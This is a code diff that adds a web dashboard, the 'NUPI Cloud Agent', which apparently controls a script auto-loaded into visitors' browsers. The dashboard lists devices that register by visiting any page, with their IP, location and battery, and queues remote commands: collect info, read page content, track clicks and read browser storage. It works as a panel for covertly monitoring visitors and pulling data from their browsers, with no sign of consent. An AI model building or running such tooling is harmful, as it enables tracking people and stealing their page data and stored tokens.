@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NUPI Cloud Agent - Live Device Dashboard</title>
+    
+    <!-- NUPI CLOUD AGENT AUTO-LOADS -->
+    <script src="/nupi-cloud-agent.js"></script>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #1e1e1e; color: #cccccc;
+        }
+        header {
+            background: #252526; padding: 20px; border-bottom: 1px solid #3c3c3c;
+            text-align: center;
+        }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        .stats {
+            display: flex; justify-content: center; gap: 30px; margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        .stat { text-align: center; }
+        .stat-value { font-size: 32px; color: #4ec9b0; font-weight: bold; }
+        .stat-label { font-size: 12px; color: #858585; margin-top: 5px; }
+        
+        .container { padding: 20px; max-width: 1400px; margin: 0 auto; }
+        
+        .devices-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+        
+        .device-card {
+            background: #252526; border: 1px solid #3c3c3c; border-radius: 8px;
+            padding: 20px; transition: all 0.3s;
+        }
+        .device-card:hover { border-color: #007acc; transform: translateY(-2px); }
+        
+        .device-header {
+            display: flex; justify-content: space-between; align-items: center;
+            margin-bottom: 15px;
+        }
+        .device-id { font-size: 14px; font-weight: 600; }
+        .device-status {
+            padding: 4px 10px; border-radius: 12px; font-size: 11px;
+            background: #4ec9b0; color: #1e1e1e; font-weight: 600;
+        }
+        .device-status.offline { background: #666; }
+        
+        .device-info { font-size: 13px; line-height: 1.8; color: #cccccc; }
+        .device-info strong { color: #4ec9b0; min-width: 100px; display: inline-block; }
+        
+        .device-actions {
+            display: flex; gap: 8px; margin-top: 15px; flex-wrap: wrap;
+        }
+        .btn {
+            background: #0e639c; color: #fff; border: none;
+            padding: 8px 14px; border-radius: 4px; font-size: 12px;
+            cursor: pointer; transition: all 0.2s;
+        }
+        .btn:hover { background: #1177bb; }
+        .btn-small { padding: 6px 10px; font-size: 11px; }
+        
+        .learning-section {
+            background: #252526; border: 1px solid #3c3c3c;
+            border-radius: 8px; padding: 20px; margin-top: 20px;
+        }
+        .learning-section h2 { font-size: 18px; margin-bottom: 15px; color: #4ec9b0; }
+        .learning-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        .learning-stat {
+            background: #1e1e1e; padding: 15px; border-radius: 6px;
+            border: 1px solid #3c3c3c;
+        }
+        .learning-stat-value { font-size: 24px; color: #4ec9b0; font-weight: bold; }
+        .learning-stat-label { font-size: 11px; color: #858585; margin-top: 5px; }
+        
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .pulse { animation: pulse 2s infinite; }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>🌐 NUPI Cloud Agent Dashboard</h1>
+        <p style="color: #858585; font-size: 13px; margin-top: 5px;">
+            Real-time device monitoring & control - No installation required
+        </p>
+        <div class="stats">
+            <div class="stat">
+                <div class="stat-value pulse" id="deviceCount">0</div>
+                <div class="stat-label">Devices Online</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="eventCount">0</div>
+                <div class="stat-label">Events Tracked</div>
+            </div>
+            <div class="stat">
+                <div class="stat-value" id="activeCount">0</div>
+                <div class="stat-label">Active Now</div>
+            </div>
+        </div>
+    </header>
+    
+    <div class="container">
+        <div class="devices-grid" id="devicesGrid">
+            <div style="text-align: center; padding: 40px; color: #858585; grid-column: 1/-1;">
+                ⏳ Loading devices...
+            </div>
+        </div>
+        
+        <div class="learning-section" id="learningSection">
+            <h2>📊 Cloud Learning Data</h2>
+            <div class="learning-grid" id="learningGrid">
+                <!-- Populated by JS -->
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        async function loadDevices() {
+            try {
+                const res = await fetch('/api/cloud/devices');
+                const data = await res.json();
+                
+                const grid = document.getElementById('devicesGrid');
+                if (data.devices.length === 0) {
+                    grid.innerHTML = '<div style="text-align: center; padding: 40px; color: #858585; grid-column: 1/-1;">No devices registered yet. Visit any page to auto-register!</div>';
+                    return;
+                }
+                
+                grid.innerHTML = data.devices.map(d => {
+                    const isOnline = Date.now() - new Date(d.last_seen).getTime() < 60000;
+                    const battery = d.battery?.level ? Math.round(d.battery.level * 100) + '%' : 'N/A';
+                    
+                    return `
+                        <div class="device-card">
+                            <div class="device-header">
+                                <div class="device-id">${d.deviceType === 'mobile' ? '📱' : d.deviceType === 'tablet' ? '📋' : '🖥️'} ${d.device_id.substring(0, 20)}</div>
+                                <div class="device-status ${isOnline ? '' : 'offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</div>
+                            </div>
+                            <div class="device-info">
+                                <div><strong>Platform:</strong> ${d.platform}</div>
+                                <div><strong>Type:</strong> ${d.deviceType}</div>
+                                <div><strong>Screen:</strong> ${d.screen.width}x${d.screen.height}</div>
+                                <div><strong>Battery:</strong> ${battery} ${d.battery?.charging ? '⚡' : ''}</div>
+                                <div><strong>Location:</strong> ${d.location ? d.location.latitude.toFixed(2) + ', ' + d.location.longitude.toFixed(2) : 'N/A'}</div>
+                                <div><strong>IP:</strong> ${d.ip || 'N/A'}</div>
+                                <div><strong>Last Seen:</strong> ${new Date(d.last_seen).toLocaleTimeString()}</div>
+                            </div>
+                            <div class="device-actions">
+                                <button class="btn btn-small" onclick="collectInfo('${d.device_id}')">Collect Info</button>
+                                <button class="btn btn-small" onclick="getPage('${d.device_id}')">Get Page</button>
+                                <button class="btn btn-small" onclick="trackClicks('${d.device_id}')">Track Clicks</button>
+                                <button class="btn btn-small" onclick="getStorage('${d.device_id}')">Get Storage</button>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+                
+                document.getElementById('deviceCount').textContent = data.count;
+                document.getElementById('eventCount').textContent = data.total_events;
+                
+            } catch (e) {
+                console.error('Failed to load devices:', e);
+            }
+        }
+        
+        async function loadLearning() {
+            try {
+                const res = await fetch('/api/cloud/learning');
+                const data = await res.json();
+                
+                const grid = document.getElementById('learningGrid');
+                grid.innerHTML = `
+                    <div class="learning-stat">
+                        <div class="learning-stat-value">${data.total_devices}</div>
+                        <div class="learning-stat-label">Total Devices</div>
+                    </div>
+                    <div class="learning-stat">
+                        <div class="learning-stat-value">${data.active_now}</div>
+                        <div class="learning-stat-label">Active Now</div>
+                    </div>
+                    <div class="learning-stat">
+                        <div class="learning-stat-value">${data.total_events}</div>
+                        <div class="learning-stat-label">Total Events</div>
+                    </div>
+                    <div class="learning-stat">
+                        <div class="learning-stat-value">${data.locations.length}</div>
+                        <div class="learning-stat-label">Locations Tracked</div>
+                    </div>
+                    <div class="learning-stat">
+                        <div class="learning-stat-value">${Object.keys(data.device_types).length}</div>
+                        <div class="learning-stat-label">Device Types</div>
+                    </div>
+                    <div class="learning-stat">
+                        <div class="learning-stat-value">${Object.keys(data.platforms).length}</div>
+                        <div class="learning-stat-label">Platforms</div>
+                    </div>
+                `;
+                
+                document.getElementById('activeCount').textContent = data.active_now;
+                
+            } catch (e) {
+                console.error('Failed to load learning data:', e);
+            }
+        }
+        
+        async function collectInfo(deviceId) {
+            await executeCommand(deviceId, 'collect_info');
+        }
+        
+        async function getPage(deviceId) {
+            await executeCommand(deviceId, 'get_page_content');
+        }
+        
+        async function trackClicks(deviceId) {
+            await executeCommand(deviceId, 'track_clicks');
+        }
+        
+        async function getStorage(deviceId) {
+            await executeCommand(deviceId, 'get_storage');
+        }
+        
+        async function executeCommand(deviceId, type, params = {}) {
+            try {
+                const res = await fetch('/api/cloud/execute', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: deviceId, type, ...params })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    alert(`✅ Command queued: ${type}\nCommand ID: ${data.command_id}`);
+                }
+            } catch (e) {
+                alert('❌ Failed to queue command');
+            }
+        }
+        
+        // Auto-refresh
+        loadDevices();
+        loadLearning();
+        setInterval(() => {
+            loadDevices();
+            loadLearning();
+        }, 5000);
+    </script>
+</body>
+</html>
